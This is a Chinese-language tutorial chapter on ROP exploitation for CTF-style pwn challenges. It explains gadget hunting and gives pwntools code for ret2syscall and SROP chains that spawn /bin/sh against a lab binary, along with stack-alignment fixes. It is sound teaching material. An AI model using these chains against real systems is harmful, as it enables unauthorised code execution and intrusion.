# 第 11 章 ROP：搭建自己的指令大厦

> 如果程序里没有你需要的完整函数，那就用它的碎片——以 ret 结尾的短指令序列。这些碎片像乐高积木，能拼出任何你想要的逻辑。

---

## 11.1 ROP 的思想

**ROP（Return-Oriented Programming，面向返回编程）** 的核心洞察是：

> 一个程序的代码里，藏着无数以 `ret` 结尾的短指令片段（gadget）。如果能控制栈，就能控制这些 gadget 的执行顺序，从而拼凑出任意计算。

例如，程序里可能有这些指令：

```asm
pop rdi; ret
pop rsi; ret
pop rdx; ret
mov rax, rdi; ret
syscall
```

把它们串起来，就能执行一个系统调用。你不需要在程序里找到一整段 `system("/bin/sh")` 的代码——只需要这些碎片。

### 为什么 ROP 能绕过 NX

NX 让栈不可执行，但 ROP **不执行栈上的代码**。栈上只放「数据」——gadget 的地址和参数。真正执行的代码来自 `.text` 段（本来就可执行）。

```text
栈上内容（数据）：
[ pop rdi; ret 地址 ][ "/bin/sh" 地址 ][ system 地址 ]
         ↓                    ↓               ↓
实际执行的代码：  程序 .text 段里的指令    libc 里的 system
```

---

## 11.2 gadget 的来源

### 11.2.1 程序自身

用 `ROPgadget` 扫描：

```bash
# 所有 gadget
ROPgadget --binary ./vuln

# 只看 pop/ret 类
ROPgadget --binary ./vuln --only 'pop|ret'

# 找特定指令
ROPgadget --binary ./vuln | grep 'pop rdi'

# 深度扫描（更慢但更全）
ROPgadget --binary ./vuln --depth 20
```

或者用 `ropper`：

```bash
ropper --file ./vuln --search 'pop rdi'
```

### 11.2.2 libc

libc 里有海量 gadget（因为它很大），但需要先泄露 libc 基址。找法：

```bash
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only 'pop|ret' > gadgets.txt
```

然后在脚本里加上 libc_base。

### 11.2.3 vsyscall / vdso

Linux 内核为每个进程映射了两个特殊区域：

- **vsyscall**：地址固定（如 `0xffffffffff600000`），里面有 `syscall; ret`，不受 ASLR 影响。在新内核上通常被禁用或模拟。
- **vdso**：地址随机，但有时可用于绕过某些限制。

这些在高级利用中有特殊用途（比如绕过某些 ASLR 场景），入门阶段了解即可。

---

## 11.3 用 pwntools 的 ROP 对象

手写 ROP 链容易出错，pwntools 提供了 `ROP` 对象来自动构造：

```python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# 自动找 pop rdi; ret
rop.call('puts', [elf.got['puts']])
rop.call('main')

print(rop.dump())    # 打印 ROP 链的结构
payload = flat({72: rop.chain()})
```

`rop.call()` 会自动找到参数传递所需的 gadget（比如 `pop rdi; ret`），并按正确的顺序构造链。

```python
# 查找 gadget
rop.find_gadget(['pop rdi', 'ret'])
rop.find_gadget(['pop rsi', 'pop r15', 'ret'])
rop.rdi    # 返回能设置 rdi 的 gadget 地址
rop.rsi    # 设置 rsi
rop.rdx    # 设置 rdx
```

如果程序里找不到需要的 gadget，pwntools 还可以结合 libc：

```python
libc = ELF('./libc.so.6')
rop = ROP([elf, libc])    # 从两个二进制里找 gadget
```

---

## 11.4 构造复杂的 ROP 链

### 11.4.1 调用多个函数

假设要依次调用 `puts("hello")` 和 `puts("world")`：

```python
rop = ROP(elf)
rop.call('puts', [elf.sym['hello_str']])
rop.call('puts', [elf.sym['world_str']])
rop.call('exit', [0])

payload = flat({offset: rop.chain()})
```

### 11.4.2 多参数函数调用（64 位）

x86-64 下前 6 个参数依次放在 rdi、rsi、rdx、rcx、r8、r9。要调用 `read(0, buf, 100)`：

```python
rop = ROP(elf)
rop.call('read', [0, elf.bss(), 100])
```

pwntools 会自动找 `pop rdi; ret`、`pop rsi; ret`、`pop rdx; ret` 等 gadget。

如果程序里找不到 `pop rdx; ret`，可能需要用 ret2csu（第 10 章讲过）来找设置 rdx 的 gadget。

### 11.4.3 读写内存

用 ROP 调用 `read` 把数据写入 `.bss`，再用 `puts` 打印出来——这是构造任意读写原语的基础：

```python
rop = ROP(elf)
rop.call('read', [0, elf.bss(), 0x100])    # 从 stdin 读 0x100 字节到 bss
rop.call('puts', [elf.bss()])              # 打印 bss 的内容
```

---

## 11.5 ret2syscall：直接发系统调用

不需要通过 libc 函数，直接在 ROP 链里执行系统调用。

在 x86-64 下，系统调用号放在 rax，参数放在 rdi/rsi/rdx，然后执行 `syscall` 指令。

需要的 gadget：

- `pop rax; ret`（设置系统调用号）
- `pop rdi; ret`（参数 1）
- `pop rsi; ret`（参数 2）
- `pop rdx; ret`（参数 3）
- `syscall; ret`（触发系统调用）

`execve("/bin/sh", NULL, NULL)` 的系统调用号是 59（0x3b）：

```python
rop = ROP(elf)
rop.raw(rop.find_gadget(['pop rax', 'ret']).address)
rop.raw(59)                                     # rax = 59 (execve)
rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
rop.raw(binsh_addr)                             # rdi = "/bin/sh"
rop.raw(rop.find_gadget(['pop rsi', 'ret']).address)
rop.raw(0)                                      # rsi = NULL
rop.raw(rop.find_gadget(['pop rdx', 'ret']).address)
rop.raw(0)                                      # rdx = NULL
rop.raw(rop.find_gadget(['syscall']).address)   # 执行 execve

payload = flat({offset: rop.chain()})
```

ret2syscall 的好处：不依赖 libc，不需要 `system` 函数。只要能找到 gadget 和 `/bin/sh` 字符串就行。

---

## 11.6 SROP：信号帧的艺术

**SROP（Sigreturn-Oriented Programming）** 是一种高级 ROP 技术，利用 Linux 的「信号返回」机制。

### 11.6.1 原理

当 Linux 进程收到信号时，内核会把当前所有寄存器的值保存到一个「信号帧」（sigreturn frame）里，压到用户栈上，然后跳转到信号处理程序。信号处理程序执行完后，会调用 `sigreturn` 系统调用，内核根据栈上的信号帧**恢复所有寄存器**。

关键漏洞：**内核不验证信号帧的真实性**——它直接从栈上读取帧内容并恢复寄存器。如果攻击者能伪造一个信号帧，就能一次性控制所有寄存器（包括 rip）！

### 11.6.2 利用条件

1. 能控制栈上一段数据（写信号帧）
2. 能触发 `sigreturn`（调用 syscall 11 或 `rt_sigreturn`）

典型的利用流程：

```text
栈布局：
[ 填充 ][ sigreturn gadget 地址 ][ 伪造的 sigreturn frame ]
```

当 sigreturn 执行时，内核根据伪造的 frame 恢复寄存器——包括把 rip 设为 `execve` 的地址，并把 rdi/rsi/rdx 设为参数。一次 sigreturn 就能完成整个 getshell！

### 11.6.3 pwntools 构造 SROP

```python
from pwn import *

# 构造 SignalFrame
frame = SigreturnFrame()
frame.rax = 59                    # execve
frame.rdi = binsh_addr            # "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget        # 执行 syscall 的地址

payload = flat({
    offset: [
        pop_rax_gadget,           # rax = 11 (sigreturn 系统调用号)
        11,
        syscall_gadget,           # 触发 sigreturn
        bytes(frame)              # 伪造的信号帧
    ]
})
```

SROP 在对抗 CET/Shadow Stack 时特别有用（因为它不依赖 ret 指令），但在入门阶段了解即可。

---

## 11.7 栈对齐深入探讨

再回到栈对齐这个「玄学」问题。

### 11.7.1 为什么需要对齐

x86-64 的 System V ABI 规定：

- 在 `call` 指令执行前，rsp 必须是 16 字节对齐的
- `call` 会压入 8 字节返回地址，所以进入函数后 rsp 是 `8 mod 16`（不对齐）
- 函数序言里的 `push rbp` 再减 8，恢复对齐

但 ROP 链中我们是用 `ret` 跳转的，不是 `call`，所以栈对齐状态取决于 payload 的长度和 gadget 的数量。

### 11.7.2 什么时候会出问题

libc 里的一些函数使用了 `movaps`（Move Aligned Packed Single-Precision）指令，它要求内存地址必须 16 字节对齐。`system` 函数内部就用了这个指令，所以：

- rsp 不对齐 → `movaps` 操作地址不对齐 → SIGSEGV

### 11.7.3 解决方法

在 ROP 链开头插入一个 `ret` gadget（消耗 8 字节栈空间，改变对齐状态）：

```python
payload = flat({
    offset: [
        ret_gadget,        # 仅一个 ret，用来调整对齐
        pop_rdi,
        binsh_addr,
        system_addr
    ]
})
```

如果加了还不行，试试两个 `ret`。或者反过来，去掉一个。

**判断方法**：崩溃后用 gdb 看 rip，如果停在 `movaps xmmword ptr [rsp+...]` 附近，就是对齐问题。

---

## 11.8 小结

这一章我们深入学习了 ROP：

- **ROP 的思想**：用程序里已有的以 ret 结尾的指令片段拼凑逻辑，绕过 NX
- **gadget 来源**：程序自身、libc、vsyscall/vdso，用 ROPgadget/ropper/pwntools 查找
- **构造 ROP 链**：用 pwntools 的 `ROP` 对象自动化，支持多参数函数调用
- **ret2syscall**：直接构造系统调用，不依赖 libc
- **SROP**：利用信号帧一次性控制所有寄存器
- **栈对齐**：调用 libc 函数时 rsp 需 16 字节对齐，用 `ret` gadget 调整

ROP 是 PWN 的「万能武器」。花时间熟练掌握它，后面的堆利用、IO_FILE 利用都会用到类似的思路。

下一章我们面对另一个常见障碍：Canary。

---

**下一章**：[Canary 绕过：与哨兵周旋](./ch12-Canary绕过.md)
